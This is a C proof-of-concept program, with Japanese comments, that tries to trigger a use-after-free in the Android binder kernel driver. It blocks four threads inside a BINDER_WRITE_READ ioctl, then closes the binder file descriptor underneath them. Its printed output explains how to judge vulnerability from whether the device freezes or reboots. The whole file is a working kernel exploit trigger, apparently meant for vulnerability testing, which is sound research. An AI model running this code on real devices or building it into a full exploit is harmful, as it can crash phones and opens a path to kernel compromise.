/*
 * binder_race_block.c - read()ブロック中にclose()を呼びUAFを誘発
 * コンパイル: ndk-build または arm-linux-gnueabihf-gcc -static -pthread
 * 実行: adb shell /data/local/tmp/binder_race_block
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <pthread.h>
#include <errno.h>
#include <stdint.h>
#include <signal.h>

#include "binder.h"

#define BINDER_DEVICE "/dev/binder"
#define MMAP_SIZE (256 * 1024)

static int binder_fd = -1;
static volatile int running = 1;
static volatile int fd_closed = 0;

// ワーカースレッド: 読み取りでブロック
void *worker_block(void *arg) {
    int tid = (int)(intptr_t)arg;
    printf("[%d] worker waiting for read...\n", tid);

    int local_fd = binder_fd;

    // 読み取り専用の BINDER_WRITE_READ (write_size=0, read_size>0)
    struct binder_write_read bwr = {
        .write_size = 0,
        .write_consumed = 0,
        .write_buffer = 0,
        .read_size = 1024,      // 1KB 読み取りバッファ
        .read_consumed = 0,
        .read_buffer = (uintptr_t)malloc(1024),
    };

    // ここでカーネル内にブロックされる (binder_wait_for_work)
    int ret = ioctl(local_fd, BINDER_WRITE_READ, &bwr);

    // close() 後はここに戻ってくる
    if (ret < 0) {
        printf("[%d] ioctl returned error: %s (errno=%d)\n", tid, strerror(errno), errno);
    } else {
        printf("[%d] ioctl returned %d, read_consumed=%llu\n", tid, ret, (unsigned long long)bwr.read_consumed);
    }

    free((void*)bwr.read_buffer);
    printf("[%d] worker stopped\n", tid);
    return NULL;
}

int main(int argc, char **argv) {
    printf("=== Binder Blocking Read + close() Race Test ===\n");

    // 1. オープン
    binder_fd = open(BINDER_DEVICE, O_RDWR);
    if (binder_fd < 0) {
        perror("open");
        return 1;
    }
    printf("binder_fd = %d\n", binder_fd);

    // 2. mmap (失敗しても続行)
    void *map = mmap(NULL, MMAP_SIZE, PROT_READ | PROT_WRITE,
                     MAP_SHARED, binder_fd, 0);
    if (map == MAP_FAILED) {
        perror("mmap (ignored)");
    } else {
        printf("mmap succeeded at %p\n", map);
    }

    // 3. ワーカースレッドを起動 (4つ)
    pthread_t threads[4];
    for (int i = 0; i < 4; i++) {
        pthread_create(&threads[i], NULL, worker_block, (void*)(intptr_t)(i+1));
    }

    // 4. スレッドが確実にカーネル内でブロックするまで待つ (2秒)
    printf("Waiting 2 seconds for workers to block inside kernel...\n");
    sleep(2);

    // 5. close() を呼び出し、競合を発生させる
    printf("Calling close(binder_fd) ...\n");
    fd_closed = 1;
    close(binder_fd);
    binder_fd = -1;

    // 6. スレッドの終了を待つ
    running = 0;
    for (int i = 0; i < 4; i++) {
        pthread_join(threads[i], NULL);
    }

    printf("Test finished.\n");
    printf("--- 判定方法 ---\n");
    printf("1. デバイスが再起動/フリーズした場合 → 脆弱性あり（UAF発生）\n");
    printf("2. プロセスが 'Killed' になった場合 → カーネルが異常を検出（保護機構動作）\n");
    printf("3. 何も起こらず正常終了した場合 → このパスでは脆弱性なし（または保護が有効）\n");
    return 0;
}
